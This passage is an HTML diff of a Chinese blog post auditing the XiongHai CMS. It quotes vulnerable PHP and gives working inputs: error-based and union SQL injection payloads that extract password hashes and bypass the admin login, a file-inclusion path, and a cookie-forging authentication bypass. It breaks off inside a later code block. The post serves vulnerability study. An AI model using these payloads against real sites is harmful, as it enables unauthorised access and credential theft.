@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>熊海CMS - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="熊海CMS" />
+<meta property="og:description" content="熊海CMS审计" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/%E7%86%8A%E6%B5%B7cms/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-11T13:08:34+00:00" />
+<meta property="article:modified_time" content="2022-03-11T13:08:34+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="熊海CMS"/>
+<meta name="twitter:description" content="熊海CMS审计"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/%E7%86%8A%E6%B5%B7cms/" /><link rel="prev" href="https://mi3aka.eu.org/vulnhub-hacksudo/" /><link rel="next" href="https://mi3aka.eu.org/bluecms/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "熊海CMS",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/%E7%86%8A%E6%B5%B7cms\/"
+        },"genre": "posts","wordcount":  3999 ,
+        "url": "https:\/\/mi3aka.eu.org\/%E7%86%8A%E6%B5%B7cms\/","datePublished": "2022-03-11T13:08:34+00:00","dateModified": "2022-03-11T13:08:34+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">熊海CMS</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-11">2022-03-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 3999 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#indexphp任意文件包含">index.php任意文件包含</a></li>
+    <li><a href="#adminfilesloginphp存在sql注入">admin/files/login.php存在SQL注入</a></li>
+    <li><a href="#inccheckloginphp存在权限绕过漏洞">inc/checklogin.php存在权限绕过漏洞</a></li>
+    <li><a href="#adminfileseditlinkphp存在sql注入">admin/files/editlink.php存在SQL注入</a></li>
+    <li><a href="#adminfileseditcolumnphp存在sql注入">admin/files/editcolumn.php存在SQL注入</a></li>
+    <li><a href="#adminfilescolumnlistphp存在sql注入">admin/files/columnlist.php存在SQL注入</a></li>
+    <li><a href="#adminfilescommentlistphp存在sql注入">admin/files/commentlist.php存在SQL注入</a></li>
+    <li><a href="#filessubmitphp存在sql注入">files/submit.php存在SQL注入</a></li>
+    <li><a href="#filescontentphp存在sql注入">files/content.php存在SQL注入</a></li>
+    <li><a href="#filessoftwarephp存在sql注入">files/software.php存在SQL注入</a></li>
+    <li><a href="#installindexphp存在sql注入">install/index.php存在SQL注入</a></li>
+    <li><a href="#filessubmitphp存在存储型xss">files/submit.php存在存储型XSS</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="indexphp任意文件包含">index.php任意文件包含</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//单一入口模式
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">//关闭错误显示
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">]);</span> <span class="c1">//接收文件名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$action</span><span class="o">=</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="o">?</span><span class="s1">&#39;index&#39;</span><span class="o">:</span><span class="nv">$file</span><span class="p">;</span> <span class="c1">//判断为空或者等于index
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span><span class="p">(</span><span class="s1">&#39;files/&#39;</span><span class="o">.</span><span class="nv">$action</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">);</span> <span class="c1">//载入相应文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>admin/index.php</code>内容一样,同样存在任意文件包含</p>
+<p>在网站根目录新建<code>info.php</code>写入<code>phpinfo</code>,传入<code>r=../info</code>即可对<code>info.php</code>进行包含</p>
+<p>但是由于<code>addslashes</code>的存在以及php版本的限制,不能进行00截断绕过</p>
+<h2 id="adminfilesloginphp存在sql注入">admin/files/login.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ob_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$login</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$checkbox</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;checkbox&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$login</span> <span class="o">&lt;&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM manage WHERE user=&#39;</span><span class="si">$user</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$users</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，用户名或者密码错误。&#39;);history.back();&lt;/Script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$passwords</span> <span class="o">=</span> <span class="nv">$users</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span> <span class="o">&lt;&gt;</span> <span class="nv">$passwords</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，用户名或者密码错误。&#39;);history.back();&lt;/Script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//写入登录信息并记住30天
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$checkbox</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">30</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;this.location=&#39;?r=index&#39;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">ob_end_flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到<code>$user = $_POST['user'];</code>和<code>$query = &quot;SELECT * FROM manage WHERE user='$user'&quot;;</code></p>
+<p><code>user</code>没有经过任何过滤就拼接到语句中</p>
+<p>首先是可以使用报错注入读取用户名和密码</p>
+<p>user传入<code>' or updatexml(1,concat(0x7e,(select @@version),0x7e),1)#</code>即可带出数据</p>
+<p>user传入<code>' or updatexml(1,concat(0x7e,(select group_concat(password) from manage),0x7e),1)#</code>即可读出md5之后的密码</p>
+<p>除了对md5进行反查外,还可以通过伪造password来进行登录,已知一共有8列</p>
+<p>user传入<code>' union select 1,2,3,4,5,6,7,8#</code>,可以导致sql查询返回的结果为4,而验证密码手段为<code>md5($password) &lt;&gt; $passwords</code>,传入某个字符串的md5并将该字符串作为密码传入即可登录</p>
+<p><code>asdf 912ec803b2ce49e4a541068d495ab570</code></p>
+<p>user传入<code>' union select 1,2,3,'912ec803b2ce49e4a541068d495ab570',5,6,7,8#</code>,password传入<code>asdf</code>即可登录</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209734.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209734.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209734.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209734.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209734.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209734.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209433.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209433.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209433.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209433.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209433.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022209433.png" /></p>
+<blockquote>
+<p>注意右上方的用户名</p>
+</blockquote>
+<h2 id="inccheckloginphp存在权限绕过漏洞">inc/checklogin.php存在权限绕过漏洞</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span><span class="o">=</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ?r=login&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">;</span>	
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$_COOKIE['user']</code>可以被用户控制,从而绕过权限检查,使用cms中的大部分功能</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022212075.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022212075.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022212075.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022212075.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022212075.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022212075.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022214447.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022214447.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022214447.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022214447.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022214447.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203022214447.png" /></p>
+<blockquote>
+<p>注意右上方的用户名</p>
+</blockquote>
+<h2 id="adminfileseditlinkphp存在sql注入">admin/files/editlink.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/checklogin.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$linklistopen</span><span class="o">=</span><span class="s1">&#39;class=&#34;open&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM link WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$link</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>单引号闭合即可,可以使用报错注入</p>
+<p><code>admin/?r=editlink&amp;id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+</code></p>
+<h2 id="adminfileseditcolumnphp存在sql注入">admin/files/editcolumn.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/checklogin.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$columnopen</span> <span class="o">=</span> <span class="s1">&#39;class=&#34;open&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$type</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM nav WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$nav</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM navclass WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
